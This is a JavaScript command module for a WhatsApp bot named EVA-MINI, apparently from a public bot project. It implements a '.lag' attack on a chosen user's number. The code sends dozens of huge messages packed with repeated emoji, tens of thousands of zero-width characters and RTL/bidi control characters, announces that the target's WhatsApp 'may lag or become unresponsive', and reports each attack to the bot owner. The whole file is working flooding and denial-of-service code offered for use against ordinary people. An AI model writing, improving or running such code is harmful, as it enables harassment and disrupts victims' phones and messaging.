// commands/lag.js - Lag Attack for EVA-MINI
const { jidNormalizedUser } = require('@whiskeysockets/baileys');

module.exports = async (sock, from, msg, args, isAdmin, botData) => {
    try {
        // ============================================
        // REACTION - START
        // ============================================
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '🐌',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // ADMIN/OWNER CHECK
        // ============================================
        const sender = msg.key.participant || from;
        const botNumber = jidNormalizedUser(sock.user.id);
        const isOwner = sender.includes(botNumber.split('@')[0]) || msg.key.fromMe;
        
        let isAdmin = isOwner;
        if (!isAdmin && from.endsWith('@g.us')) {
            try {
                const groupMetadata = await sock.groupMetadata(from);
                const participant = groupMetadata.participants.find(p => p.id === sender);
                isAdmin = participant && (participant.admin === 'admin' || participant.admin === 'superadmin');
            } catch (e) {
                isAdmin = false;
            }
        }

        if (!isAdmin) {
            await sock.sendMessage(from, {
                text: "❌ *Only admins/owner can use this command!*"
            });
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: '⛔',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        // ============================================
        // GET TARGET
        // ============================================
        let target;
        const q = args.join(' ');
        const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        const quoted = msg.message?.extendedTextMessage?.contextInfo?.participant;

        if (q && q.match(/\d/)) {
            const cleanNumber = q.replace(/\D/g, '');
            target = jidNormalizedUser(cleanNumber + '@s.whatsapp.net');
        } else if (mentioned) {
            target = mentioned;
        } else if (quoted) {
            target = quoted;
        } else {
            await sock.sendMessage(from, {
                text: `⚠️ *Usage:* .lag [@mention] or reply to user\n\n📌 *Example:* .lag @94703945265\n\n🐌 *Send lag payload to target!*`
            });
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: 'ℹ️',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        // ============================================
        // STATUS MESSAGE
        // ============================================
        const targetNumber = target.split('@')[0];
        const statusMsg = await sock.sendMessage(from, {
            text: `🐌 *Lagging @${targetNumber}...*\n\n⏳ Please wait...`,
            mentions: [target]
        });

        try {
            await sock.sendMessage(from, {
                react: {
                    text: '⏳',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // LAG PAYLOADS
        // ============================================
        let successCount = 0;
        let totalMessages = 30;

        // Different lag payloads
        const lagEmojis = ['🐌', '🐢', '🦥', '⏳', '🐌', '🐢', '🦥', '⏳'];

        for (let i = 0; i < totalMessages; i++) {
            try {
                const emoji = lagEmojis[i % lagEmojis.length];
                const lagText = emoji.repeat(200) + '🐌 LAG PAYLOAD 🐌'.repeat(30) + emoji.repeat(200);
                await sock.sendMessage(target, { text: lagText });
                successCount++;
                await new Promise(resolve => setTimeout(resolve, 100));
            } catch (e) {
                console.log(`Lag payload ${i + 1} failed:`, e.message);
            }
        }

        // ============================================
        // EXTRA LAG PAYLOADS
        // ============================================
        try {
            // Send massive messages with invisible characters
            for (let i = 0; i < 10; i++) {
                const invisible = '\u200B'.repeat(8000) + '\u200C'.repeat(8000) + '\u200D'.repeat(8000);
                const payload = `🐌${invisible}🐢${invisible}🦥${invisible}\nLAG #${i + 1}`.repeat(30);
                await sock.sendMessage(target, { text: payload });
                successCount++;
                await new Promise(resolve => setTimeout(resolve, 80));
            }
        } catch (e) {
            console.log('Extra lag payloads failed:', e.message);
        }

        // ============================================
        // LAG WITH RTL CHARACTERS
        // ============================================
        try {
            for (let i = 0; i < 5; i++) {
                const rtlPayload = '\u202A'.repeat(5000) + '\u202B'.repeat(5000) + '\u202D'.repeat(5000) + '\u202E'.repeat(5000);
                const payload = `🐌 LAG ${rtlPayload} 🐢 LAG ${rtlPayload} 🦥 LAG ${rtlPayload}`;
                await sock.sendMessage(target, { text: payload });
                successCount++;
                await new Promise(resolve => setTimeout(resolve, 150));
            }
        } catch (e) {
            console.log('RTL lag failed:', e.message);
        }

        // ============================================
        // LAG WITH REPEATED EMOJIS
        // ============================================
        try {
            for (let i = 0; i < 5; i++) {
                const emojiFlood = '🐌🐢🦥⏳'.repeat(5000);
                const payload = `${emojiFlood}\n🐌 LAG ATTACK #${i + 1}\n${emojiFlood}`;
                await sock.sendMessage(target, { text: payload });
                successCount++;
                await new Promise(resolve => setTimeout(resolve, 150));
            }
        } catch (e) {
            console.log('Emoji lag failed:', e.message);
        }

        // ============================================
        // LAG WITH LONG REPEATED TEXT
        // ============================================
        try {
            for (let i = 0; i < 5; i++) {
                const text = '🐌 This is a lag attack! 🐢 '.repeat(500);
                await sock.sendMessage(target, { text: text });
                successCount++;
                await new Promise(resolve => setTimeout(resolve, 100));
            }
        } catch (e) {
            console.log('Long text lag failed:', e.message);
        }

        // ============================================
        // SUCCESS MESSAGE
        // ============================================
        await sock.sendMessage(from, {
            text: `🐌 *Lag payload delivered!*\n\n📱 *Target:* @${targetNumber}\n📊 *Payloads:* ${successCount} sent\n💥 *Status:* SUCCESS\n\n⚠️ *Target's WhatsApp may lag or become unresponsive!*`,
            mentions: [target]
        });

        // ============================================
        // FINAL REACTION
        // ============================================
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '✅',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // DELETE STATUS MESSAGE
        // ============================================
        try {
            await new Promise(resolve => setTimeout(resolve, 3000));
            await sock.sendMessage(from, {
                delete: statusMsg.key
            });
        } catch (e) {}

        // ============================================
        // OWNER REPORT
        // ============================================
        try {
            await sock.sendMessage(botNumber, {
                text: `🐌 *Lag Attack Report*\n\n📱 *Target:* @${targetNumber}\n👤 *By:* ${msg.pushName || 'Unknown'}\n📊 *Payloads:* ${successCount}\n✅ *Status:* SUCCESS\n🕐 *Time:* ${new Date().toLocaleString()}`,
                mentions: [target]
            });
        } catch (e) {}

    } catch (error) {
        console.error('Lag command error:', error);
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '❌',
                    key: msg.key
                }
            });
        } catch (e) {}
        await sock.sendMessage(from, {
            text: `❌ *Error:* ${error.message}`
        });
    }
};